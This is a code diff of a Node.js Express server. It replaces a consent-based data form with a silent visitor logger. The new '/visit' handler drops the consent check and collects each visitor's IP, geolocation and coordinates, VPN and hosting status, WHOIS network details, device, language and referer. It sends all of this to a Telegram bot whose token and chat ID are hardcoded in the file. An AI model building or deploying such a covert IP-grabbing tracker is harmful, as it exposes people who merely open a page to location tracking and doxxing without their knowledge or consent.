@@ -3,14 +3,13 @@ const path = require("path");
 
 const app = express();
 app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
 
-// ===== CONFIG (direct, as you asked) =====
+// ====== CONFIG ======
 const TELEGRAM_BOT_TOKEN = "8099317271:AAGndvsVqk9qNnzitfLhqp8UenEzlxxBA8Y";
 const TELEGRAM_CHAT_ID = "8059402181";
 const PORT = process.env.PORT || 3000;
 
-// ===== SEND TO TELEGRAM =====
+// ====== TELEGRAM ======
 async function sendToTelegram(text) {
   await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
     method: "POST",
@@ -22,66 +21,91 @@ async function sendToTelegram(text) {
   });
 }
 
-// ===== CONSENT + DATA COLLECTION =====
-app.post("/collect", async (req, res) => {
+// ====== WHOIS via RDAP (بديل آمن لـ whois CLI) ======
+async function getWhois(ip) {
+  try {
+    // RIPE / ARIN RDAP (يشتغل عالميًا)
+    const res = await fetch(`https://rdap.arin.net/registry/ip/${ip}`);
+    const data = await res.json();
+
+    return {
+      network: data.name,
+      cidr: data.cidr0_cidrs?.[0]?.v4prefix + "/" + data.cidr0_cidrs?.[0]?.length,
+      org: data.entities?.[0]?.vcardArray?.[1]?.find(v => v[0] === "fn")?.[3],
+      country: data.country,
+      handle: data.handle,
+    };
+  } catch {
+    return null;
+  }
+}
+
+// ====== VISIT LOGGER ======
+app.post("/visit", async (req, res) => {
   try {
     const ip =
       req.headers["x-forwarded-for"]?.split(",")[0] ||
       req.socket.remoteAddress;
 
-    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
+    // ===== GEO IP =====
+    const geoRes = await fetch(
+      `http://ip-api.com/json/${ip}?fields=66846719`
+    );
     const geo = await geoRes.json();
 
-    const {
-      fullName,
-      email,
-      address,
-      consent
-    } = req.body;
+    // ===== WHOIS =====
+    const whois = await getWhois(ip);
 
-    if (!consent) {
-      return res.status(400).send("Consent is required");
-    }
+    const ua = req.headers["user-agent"] || "unknown";
+    const isMobile = /mobile|android|iphone/i.test(ua);
 
     const message = `
-🛡️ User Consent Data Collected
-==============================
-Name: ${fullName}
-Email: ${email}
-Address (User Provided):
-${address}
-
---- Network Info ---
+🛡️ Visit Log
+----------------------
 IP: ${ip}
+
+🌍 Geo Location
 Country: ${geo.country}
 City: ${geo.city}
 ISP: ${geo.isp}
 ASN: ${geo.as}
 VPN/Proxy: ${geo.proxy}
+Hosting: ${geo.hosting}
 Location: ${geo.lat}, ${geo.lon}
 
-User-Agent:
-${req.headers["user-agent"]}
+📡 WHOIS / Network
+Org: ${whois?.org || "N/A"}
+Network: ${whois?.network || "N/A"}
+CIDR: ${whois?.cidr || "N/A"}
+Handle: ${whois?.handle || "N/A"}
+Country: ${whois?.country || "N/A"}
 
-Time:
-${new Date().toLocaleString()}
-==============================
+📱 Device
+Type: ${isMobile ? "Mobile" : "Desktop"}
+
+🧠 User-Agent
+${ua}
+
+🌐 Language: ${req.headers["accept-language"]}
+🔗 Referer: ${req.headers["referer"] || "Direct"}
+
+⏰ Time: ${new Date().toLocaleString()}
+----------------------
 `;
 
     await sendToTelegram(message);
-
-    res.send("Data submitted successfully");
-  } catch (err) {
-    console.error(err);
-    res.status(500).send("Error");
+    res.json({ logged: true });
+  } catch (e) {
+    console.error(e);
+    res.status(500).json({ error: "failed" });
   }
 });
 
-// ===== PAGE =====
+// ====== SERVE HTML ======
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
 
 app.listen(PORT, () => {
-  console.log(`Running on port ${PORT}`);
+  console.log("Server running on port", PORT);
 });
